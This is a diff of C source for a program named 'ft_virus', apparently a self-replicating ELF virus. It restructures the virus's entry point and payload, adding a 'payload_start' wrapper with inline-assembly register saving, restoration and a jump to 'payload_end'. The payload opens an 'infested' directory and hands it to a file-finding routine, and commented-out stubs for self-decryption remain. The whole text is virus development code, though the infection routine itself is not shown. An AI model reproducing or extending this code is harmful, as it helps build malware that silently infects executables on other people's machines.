@@ -1,11 +1,5 @@
 #include "ft_virus.h"
 
-void start(void)
-{
-	payload();
-	EXIT(0);
-}
-
 void FORCE_INLINE push_registers()
 {
 	asm volatile (
@@ -49,6 +43,7 @@ void FORCE_INLINE pop_registers()
 		"pop rbx;"
 		"pop rbp;"
 		"pop rsp;"
+		"add rsp, 0x8;"
 		"mov rdi, 0x0;"
 		: : :
 		);
@@ -60,13 +55,13 @@ void payload()
 	int fd;
 	char infested_dir[] = INFESTED_DIR;
 	u64  ret;
+	char hello[] = "Hello there\n";
 
-	push_registers();
-	fd = 0xdeadbeaf;
+	WRITE(1, hello, sizeof(hello));
 	ret = get_rel_addr();
-	data.infos.pl_size = &payload_end - &payload;
-	data.key = 0xdeadbeaf;
-	data.decrypt_start = 0xdeadbeaf;
+	data.infos.pl_size = &payload_end - &payload_start;
+	// data.key = 0xdeadbeaf;
+	// data.decrypt_start = 0xdeadbeaf;
 	//mprotect_us();
 	//decrypt();
 	fd = OPEN(infested_dir, O_RDONLY | O_DIRECTORY);
@@ -74,8 +69,23 @@ void payload()
 		payload_end();
 	finder(data, fd);
 	CLOSE(fd);
+}
+
+void start(void)
+{
+	payload();
+	EXIT(0);
+}
+
+void payload_start()
+{
 	push_registers();
-	payload_end();
+	payload();
+	pop_registers();
+	asm volatile (
+		// "int3;"
+		"jmp payload_end" : : :
+	);
 }
 
 void payload_end(void)
